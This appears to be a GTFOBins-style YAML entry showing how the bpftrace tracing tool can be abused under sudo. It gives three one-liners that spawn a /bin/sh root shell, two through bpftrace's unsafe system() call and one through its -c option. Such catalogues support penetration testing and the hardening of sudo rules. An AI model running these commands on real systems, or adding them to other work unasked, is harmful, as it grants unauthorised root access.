---
functions:
  shell:
  - code: |-
      sudo bpftrace --unsafe -e 'BEGIN {system("/bin/sh 1<&0");exit()}'
    contexts:
      sudo:
  - code: |-
      echo 'BEGIN {system("/bin/sh 1<&0");exit()}' >x
      bpftrace --unsafe x
    contexts:
      sudo:
  - code: |-
      bpftrace -c /bin/sh -e 'END {exit()}'
    contexts:
      sudo:
...
